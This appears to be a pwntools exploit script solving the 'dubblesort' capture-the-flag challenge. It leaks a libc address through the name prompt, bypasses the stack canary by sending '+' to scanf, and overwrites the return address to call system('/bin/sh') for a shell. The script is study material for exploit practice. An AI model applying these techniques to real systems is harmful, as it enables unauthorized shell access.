from pwn import *

def start(argv = [], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-peda
breakrva 0xa18 
breakrva 0xa32
breakrva 0xa95
breakrva 0xaeb

continue
'''.format(**locals())

#Binary filename
exe = './dubblesort'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

################################################################

p = start()
libc = ELF("./libc_32.so.6")

'''
leak libc_base nho vao loi %s trong your name, sao do bypass canary nho vao
2 ki tu '+' '-' de giu nguyen gia tri canary sau do viet ham system va $/bin/sh
vao doan return nua la xong
'''

p.recvuntil(b"What your name :")
p.send("a" * 0x1c)
p.recvuntil("a" * 0x1c)
offset = 0x1ae244
libc_leak = u32(p.recv(4))
libc.address = libc_leak - offset
log.info("libc = "+ hex(libc.address))
log.info("system = "+ hex(libc.sym['system']))
log.info("/bin/sh = "+ hex(next(libc.search(b"/bin/sh"))))


p.recvuntil(b"sort :")
p.sendline(b"35")

for i in range(1, 25):
    print(i)
    p.sendlineafter(b"number :", str(i))

# pause()

p.sendline("+")

for i in range(9):
    p.sendlineafter(b"number :", str(libc.sym['system']))

p.sendlineafter(b"number :", str(next(libc.search(b"/bin/sh"))))

p.interactive()
